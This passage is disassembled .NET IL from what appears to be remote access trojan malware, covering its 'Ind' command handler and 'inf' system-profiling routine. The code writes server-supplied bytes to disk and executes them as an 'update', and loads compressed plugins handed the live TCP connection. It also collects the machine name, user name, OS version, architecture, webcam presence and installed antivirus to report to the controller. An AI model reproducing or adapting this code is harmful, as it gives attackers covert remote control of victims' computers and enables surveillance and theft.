        IL_23fb:  ldloc.s    V_8
        IL_23fd:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_2402:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_2407:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_240c:  call       bool j.OK::Send(string)
        IL_2411:  pop
        IL_2412:  ldc.i4     0x7d0
        IL_2417:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_241c:  ldloc.s    V_8
        IL_241e:  ldloc.s    V_6
        IL_2420:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_2425:  ldloc.s    V_8
        IL_2427:  ldstr      ".."
        IL_242c:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_2431:  pop
        IL_2432:  leave.s    IL_2477

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2434:  dup
        IL_2435:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_243a:  stloc.s    V_166
        IL_243c:  ldloc.s    V_166
        IL_243e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2443:  ldloc.s    V_166
        IL_2445:  stloc.s    V_167
        IL_2447:  ldstr      "MSG"
        IL_244c:  ldsfld     string j.OK::Y
        IL_2451:  ldstr      "Update ERROR "
        IL_2456:  ldloc.s    V_167
        IL_2458:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_245d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_2462:  call       bool j.OK::Send(string)
        IL_2467:  pop
        IL_2468:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_246d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2472:  leave      IL_26c9

      }  // end handler
      IL_2477:  call       void j.OK::UNS()
      IL_247c:  leave      IL_26c9

      IL_2481:  ldloc.2
      IL_2482:  ldstr      "Ex"
      IL_2487:  ldc.i4.0
      IL_2488:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_248d:  brtrue     IL_2552

      IL_2492:  ldsfld     object j.OK::PLG
      IL_2497:  brtrue.s   IL_24eb

      IL_2499:  ldstr      "PLG"
      IL_249e:  call       bool j.OK::Send(string)
      IL_24a3:  pop
      IL_24a4:  ldc.i4.0
      IL_24a5:  stloc.s    V_170
      IL_24a7:  br.s       IL_24b9

      IL_24a9:  ldloc.s    V_170
      IL_24ab:  ldc.i4.1
      IL_24ac:  add.ovf
      IL_24ad:  stloc.s    V_170
      IL_24af:  ldc.i4     0x3e8
      IL_24b4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_24b9:  ldsfld     object j.OK::PLG
      IL_24be:  ldnull
      IL_24bf:  cgt.un
      IL_24c1:  ldloc.s    V_170
      IL_24c3:  ldc.i4.s   20
      IL_24c5:  ceq
      IL_24c7:  or
      IL_24c8:  ldsfld     bool j.OK::Cn
      IL_24cd:  ldc.i4.0
      IL_24ce:  ceq
      IL_24d0:  or
      IL_24d1:  brfalse.s  IL_24a9

      IL_24d3:  ldsfld     object j.OK::PLG
      IL_24d8:  ldnull
      IL_24d9:  ceq
      IL_24db:  ldsfld     bool j.OK::Cn
      IL_24e0:  ldc.i4.0
      IL_24e1:  ceq
      IL_24e3:  or
      IL_24e4:  brfalse.s  IL_24eb

      IL_24e6:  leave      IL_26c9

      IL_24eb:  ldc.i4.1
      IL_24ec:  newarr     [mscorlib]System.Object
      IL_24f1:  dup
      IL_24f2:  ldc.i4.0
      IL_24f3:  ldarg.0
      IL_24f4:  stelem.ref
      IL_24f5:  stloc.s    V_168
      IL_24f7:  ldc.i4.1
      IL_24f8:  newarr     [mscorlib]System.Boolean
      IL_24fd:  dup
      IL_24fe:  ldc.i4.0
      IL_24ff:  ldc.i4.1
      IL_2500:  stelem.i1
      IL_2501:  stloc.s    V_169
      IL_2503:  ldsfld     object j.OK::PLG
      IL_2508:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_250d:  ldnull
      IL_250e:  ldstr      "ind"
      IL_2513:  ldloc.s    V_168
      IL_2515:  ldnull
      IL_2516:  ldnull
      IL_2517:  ldloc.s    V_169
      IL_2519:  ldc.i4.1
      IL_251a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_251f:  pop
      IL_2520:  ldloc.s    V_169
      IL_2522:  ldc.i4.0
      IL_2523:  ldelem.u1
      IL_2524:  brfalse    IL_261d

      IL_2529:  ldloc.s    V_168
      IL_252b:  ldc.i4.0
      IL_252c:  ldelem.ref
      IL_252d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2532:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2537:  ldtoken    uint8[]
      IL_253c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_2541:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_2546:  castclass  uint8[]
      IL_254b:  starg.s    b
      IL_254d:  br         IL_261d

      IL_2552:  ldloc.2
      IL_2553:  ldstr      "PLG"
      IL_2558:  ldc.i4.0
      IL_2559:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_255e:  brtrue     IL_261d

      IL_2563:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_2568:  ldloc.0
      IL_2569:  ldc.i4.0
      IL_256a:  ldelem.ref
      IL_256b:  ldsfld     string j.OK::Y
      IL_2570:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_2575:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_257a:  stloc.s    V_171
      IL_257c:  dup
      IL_257d:  ldarg.0
      IL_257e:  ldloc.s    V_171
      IL_2580:  ldarg.0
      IL_2581:  ldlen
      IL_2582:  conv.i4
      IL_2583:  ldloc.s    V_171
      IL_2585:  sub.ovf
      IL_2586:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_258b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_2590:  call       uint8[] j.OK::ZIP(uint8[])
      IL_2595:  ldstr      "A"
      IL_259a:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_259f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_25a4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_25a9:  stsfld     object j.OK::PLG
      IL_25ae:  ldsfld     object j.OK::PLG
      IL_25b3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_25b8:  ldnull
      IL_25b9:  ldstr      "H"
      IL_25be:  ldc.i4.1
      IL_25bf:  newarr     [mscorlib]System.Object
      IL_25c4:  dup
      IL_25c5:  ldc.i4.0
      IL_25c6:  ldsfld     string j.OK::H
      IL_25cb:  stelem.ref
      IL_25cc:  ldnull
      IL_25cd:  ldnull
      IL_25ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_25d3:  ldsfld     object j.OK::PLG
      IL_25d8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_25dd:  ldnull
      IL_25de:  ldstr      "P"
      IL_25e3:  ldc.i4.1
      IL_25e4:  newarr     [mscorlib]System.Object
      IL_25e9:  dup
      IL_25ea:  ldc.i4.0
      IL_25eb:  ldsfld     string j.OK::P
      IL_25f0:  stelem.ref
      IL_25f1:  ldnull
      IL_25f2:  ldnull
      IL_25f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_25f8:  ldsfld     object j.OK::PLG
      IL_25fd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2602:  ldnull
      IL_2603:  ldstr      "c"
      IL_2608:  ldc.i4.1
      IL_2609:  newarr     [mscorlib]System.Object
      IL_260e:  dup
      IL_260f:  ldc.i4.0
      IL_2610:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_2615:  stelem.ref
      IL_2616:  ldnull
      IL_2617:  ldnull
      IL_2618:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_261d:  leave      IL_26c9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_2622:  dup
      IL_2623:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_2628:  stloc.s    V_172
      IL_262a:  ldloc.s    V_172
      IL_262c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_2631:  ldloc.s    V_172
      IL_2633:  stloc.s    V_173
      IL_2635:  ldloc.0
      IL_2636:  ldlen
      IL_2637:  conv.i4
      IL_2638:  ldc.i4.0
      IL_2639:  ble.s      IL_2666

      IL_263b:  ldloc.0
      IL_263c:  ldc.i4.0
      IL_263d:  ldelem.ref
      IL_263e:  ldstr      "Ex"
      IL_2643:  ldc.i4.0
      IL_2644:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2649:  ldc.i4.0
      IL_264a:  ceq
      IL_264c:  ldloc.0
      IL_264d:  ldc.i4.0
      IL_264e:  ldelem.ref
      IL_264f:  ldstr      "PLG"
      IL_2654:  ldc.i4.0
      IL_2655:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_265a:  ldc.i4.0
      IL_265b:  ceq
      IL_265d:  or
      IL_265e:  brfalse.s  IL_2666

      IL_2660:  ldnull
      IL_2661:  stsfld     object j.OK::PLG
      IL_2666:  nop
      .try
      {
        IL_2667:  ldc.i4.5
        IL_2668:  newarr     [mscorlib]System.String
        IL_266d:  dup
        IL_266e:  ldc.i4.0
        IL_266f:  ldstr      "ER"
        IL_2674:  stelem.ref
        IL_2675:  dup
        IL_2676:  ldc.i4.1
        IL_2677:  ldsfld     string j.OK::Y
        IL_267c:  stelem.ref
        IL_267d:  dup
        IL_267e:  ldc.i4.2
        IL_267f:  ldloc.0
        IL_2680:  ldc.i4.0
        IL_2681:  ldelem.ref
        IL_2682:  stelem.ref
        IL_2683:  dup
        IL_2684:  ldc.i4.3
        IL_2685:  ldsfld     string j.OK::Y
        IL_268a:  stelem.ref
        IL_268b:  dup
        IL_268c:  ldc.i4.4
        IL_268d:  ldloc.s    V_173
        IL_268f:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_2694:  stelem.ref
        IL_2695:  call       string [mscorlib]System.String::Concat(string[])
        IL_269a:  call       bool j.OK::Send(string)
        IL_269f:  pop
        IL_26a0:  leave.s    IL_26bd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_26a2:  dup
        IL_26a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_26a8:  stloc.s    V_174
        IL_26aa:  ldloc.s    V_174
        IL_26ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_26b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_26b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_26bb:  leave.s    IL_26bd

      }  // end handler
      IL_26bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_26c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_26c7:  leave.s    IL_26c9

    }  // end handler
    IL_26c9:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1056 (0x420)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [mscorlib]System.DateTime V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string[] V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string[] V_14,
             int32 V_15,
             class [mscorlib]System.Exception V_16)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                            object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0060

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string j.OK::VN
      IL_0037:  call       string j.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  call       string j.OK::HWD()
      IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004b:  stloc.2
      IL_004c:  ldloca.s   V_2
      IL_004e:  call       string j.OK::ENB(string&)
      IL_0053:  ldsfld     string j.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.0
      IL_005e:  br.s       IL_00a4

      IL_0060:  ldloc.0
      IL_0061:  ldstr      "vn"
      IL_0066:  ldstr      ""
      IL_006b:  call       object j.OK::GTV(string,
                                            object)
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007a:  stloc.3
      IL_007b:  ldloca.s   V_3
      IL_007d:  call       string j.OK::DEB(string&)
      IL_0082:  ldstr      "_"
      IL_0087:  call       string j.OK::HWD()
      IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0091:  stloc.2
      IL_0092:  ldloca.s   V_2
      IL_0094:  call       string j.OK::ENB(string&)
      IL_0099:  ldsfld     string j.OK::Y
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a3:  stloc.0
      IL_00a4:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a6:  dup
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  stloc.s    V_4
      IL_00ae:  ldloc.s    V_4
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  ldloc.0
      IL_00b6:  call       string j.OK::HWD()
      IL_00bb:  stloc.2
      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       string j.OK::ENB(string&)
      IL_00c3:  ldsfld     string j.OK::Y
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  stloc.0
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    .try
    {
      IL_00db:  ldloc.0
      IL_00dc:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  stloc.0
      IL_00ec:  leave.s    IL_011a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ee:  dup
      IL_00ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f4:  stloc.s    V_5
      IL_00f6:  ldloc.s    V_5
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  ldloc.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  ldsfld     string j.OK::Y
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  stloc.0
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0118:  leave.s    IL_011a

    }  // end handler
    IL_011a:  nop
    .try
    {
      IL_011b:  ldloc.0
      IL_011c:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0121:  ldsfld     string j.OK::Y
      IL_0126:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012b:  stloc.0
      IL_012c:  leave.s    IL_015a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012e:  dup
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0134:  stloc.s    V_6
      IL_0136:  ldloc.s    V_6
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013d:  ldloc.0
      IL_013e:  ldstr      "\?\?"
      IL_0143:  ldsfld     string j.OK::Y
      IL_0148:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014d:  stloc.0
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0158:  leave.s    IL_015a

    }  // end handler
    IL_015a:  nop
    .try
    {
      IL_015b:  ldloc.0
      IL_015c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0161:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0166:  stloc.s    V_7
      IL_0168:  ldloca.s   V_7
      IL_016a:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_016f:  stloc.s    V_7
      IL_0171:  ldloca.s   V_7
      IL_0173:  ldstr      "yy-MM-dd"
      IL_0178:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_017d:  ldsfld     string j.OK::Y
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  stloc.0
      IL_0188:  leave.s    IL_01b6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_8
      IL_0192:  ldloc.s    V_8
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  ldloc.0
      IL_019a:  ldstr      "\?\?-\?\?-\?\?"
      IL_019f:  ldsfld     string j.OK::Y
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b4:  leave.s    IL_01b6

    }  // end handler
    IL_01b6:  ldloc.0
    IL_01b7:  ldsfld     string j.OK::Y
    IL_01bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c1:  stloc.0
    .try
    {
      IL_01c2:  ldloc.0
      IL_01c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01cd:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01d2:  ldstr      "Microsoft"
      IL_01d7:  ldstr      ""
      IL_01dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e1:  ldstr      "Windows"
      IL_01e6:  ldstr      "Win"
      IL_01eb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f0:  ldstr      bytearray (AE 00 ) 
      IL_01f5:  ldstr      ""
      IL_01fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ff:  ldstr      bytearray (22 21 )                                           // "!
      IL_0204:  ldstr      ""
      IL_0209:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020e:  ldstr      "  "
      IL_0213:  ldstr      " "
      IL_0218:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021d:  ldstr      " Win"
      IL_0222:  ldstr      "Win"
      IL_0227:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.0
      IL_0232:  leave.s    IL_025b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0234:  dup
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023a:  stloc.s    V_9
      IL_023c:  ldloc.s    V_9
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0243:  ldloc.0
      IL_0244:  ldstr      "\?\?"
      IL_0249:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024e:  stloc.0
      IL_024f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0259:  leave.s    IL_025b

    }  // end handler
    IL_025b:  ldloc.0
    IL_025c:  ldstr      "SP"
    IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0266:  stloc.0
    .try
    {
      IL_0267:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0271:  ldstr      " "
      IL_0276:  ldc.i4.m1
      IL_0277:  ldc.i4.0
      IL_0278:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027d:  stloc.s    V_10
      IL_027f:  ldloc.s    V_10
      IL_0281:  ldlen
      IL_0282:  conv.i4
      IL_0283:  ldc.i4.1
      IL_0284:  bne.un.s   IL_0292

      IL_0286:  ldloc.0
      IL_0287:  ldstr      "0"
      IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0291:  stloc.0
      IL_0292:  ldloc.0
      IL_0293:  ldloc.s    V_10
      IL_0295:  ldloc.s    V_10
      IL_0297:  ldlen
      IL_0298:  conv.i4
      IL_0299:  ldc.i4.1
      IL_029a:  sub.ovf
      IL_029b:  ldelem.ref
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a1:  stloc.0
      IL_02a2:  leave.s    IL_02cb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a4:  dup
      IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02aa:  stloc.s    V_11
      IL_02ac:  ldloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  ldloc.0
      IL_02b4:  ldstr      "0"
      IL_02b9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02be:  stloc.0
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c9:  leave.s    IL_02cb

    }  // end handler
    IL_02cb:  nop
    .try
    {
      IL_02cc:  ldc.i4.s   38
      IL_02ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d3:  ldstr      "x86"
      IL_02d8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.0
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string j.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.0
      IL_02f0:  br.s       IL_0303

      IL_02f2:  ldloc.0
      IL_02f3:  ldstr      " x86"
      IL_02f8:  ldsfld     string j.OK::Y
      IL_02fd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0302:  stloc.0
      IL_0303:  leave.s    IL_032c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0305:  dup
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030b:  stloc.s    V_12
      IL_030d:  ldloc.s    V_12
      IL_030f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0314:  ldloc.0
      IL_0315:  ldsfld     string j.OK::Y
      IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_031f:  stloc.0
      IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032a:  leave.s    IL_032c

    }  // end handler
    IL_032c:  call       bool j.OK::Cam()
    IL_0331:  brfalse.s  IL_0346

    IL_0333:  ldloc.0
    IL_0334:  ldstr      "Yes"
    IL_0339:  ldsfld     string j.OK::Y
    IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0343:  stloc.0
    IL_0344:  br.s       IL_0357

    IL_0346:  ldloc.0
    IL_0347:  ldstr      "No"
    IL_034c:  ldsfld     string j.OK::Y
    IL_0351:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0356:  stloc.0
    IL_0357:  ldc.i4.7
    IL_0358:  newarr     [mscorlib]System.String
    IL_035d:  dup
    IL_035e:  ldc.i4.0
    IL_035f:  ldloc.0
    IL_0360:  stelem.ref
    IL_0361:  dup
    IL_0362:  ldc.i4.1
    IL_0363:  call       string j.OK::GetAntiVirus()
    IL_0368:  stelem.ref
